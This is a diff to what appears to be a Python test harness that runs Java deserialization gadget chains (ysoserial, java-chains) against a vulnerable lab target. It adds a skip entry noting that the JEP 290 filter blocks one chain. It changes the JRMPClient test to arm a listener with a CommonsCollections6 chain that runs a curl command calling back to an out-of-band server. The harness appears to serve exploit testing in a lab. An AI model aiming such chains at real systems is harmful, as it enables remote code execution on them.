@@ -256,7 +256,9 @@ KNOWN_SKIP = {
     "jchains_hessian2_rome2":     "java-chains Exec bug + SwingLazyValue not triggered by readObject()",
     "jchains_hessian2_tostring_jackson": "java-chains Exec bug; Jackson toString secondary",
     "jchains_hessian2_tostring_xbean":   "java-chains Exec bug; Tomcat EL engine absent in vulnlab",
-    # JRMPClient: use test_jrmp_client() which arms the sidecar JRMPListener first
+    # JRMPClient: JEP 290 RMI deserialization filter (Java 8u121+) blocks non-RMI gadget classes
+    # JRMPListener infrastructure is built (sidecar port 10099), but target is Java 8u342
+    "ysoserial_jrmp_client": "JEP 290 RMI filter blocks CC6 gadget deserialization (Java 8u121+)",
     # Groovy1: groovy-*.jar not on vulnlab classpath
     "ysoserial_groovy1":           "groovy-*.jar not on target classpath",
     # java-chains BytecodeConvert+Exec bug also affects Fastjson/XStream/H2 exec chains
@@ -557,13 +559,11 @@ def test_jrmp_client(jrmp_port=10099):
 
     curl_cmd = EXEC_CMD(tok)
 
-    # Step 1: arm the JRMP listener on sidecar
-    arm_url = f"{OOBSERVER}/api/jrmp/arm"
-    arm_req = urllib.request.Request(arm_url, method="POST")
+    # Step 1: arm the JRMP listener on sidecar (query params, not form body)
+    qs = f"chain=CommonsCollections6&cmd={urllib.parse.quote(curl_cmd)}&port={jrmp_port}"
+    arm_req = urllib.request.Request(
+        f"{OOBSERVER}/api/jrmp/arm?{qs}", data=b"", method="POST")
     arm_req.add_header("Authorization", f"Bearer {TOKEN}")
-    arm_params = f"chain=CommonsCollections6&cmd={urllib.parse.quote(curl_cmd)}&port={jrmp_port}"
-    arm_req.data = arm_params.encode()
-    arm_req.add_header("Content-Type", "application/x-www-form-urlencoded")
     try:
         with urllib.request.urlopen(arm_req, timeout=15) as r:
             arm_resp = json.loads(r.read())
@@ -606,11 +606,9 @@ def test_jrmp_client(jrmp_port=10099):
     finally:
         # Disarm regardless of outcome
         try:
-            disarm_req = urllib.request.Request(
-                f"{OOBSERVER}/api/jrmp/disarm",
-                data=b"", method="POST",
-                headers={"Authorization": f"Bearer {TOKEN}"})
-            urllib.request.urlopen(disarm_req, timeout=5)
+            urllib.request.urlopen(urllib.request.Request(
+                f"{OOBSERVER}/api/jrmp/disarm", data=b"", method="POST",
+                headers={"Authorization": f"Bearer {TOKEN}"}), timeout=5)
         except Exception:
             pass
 
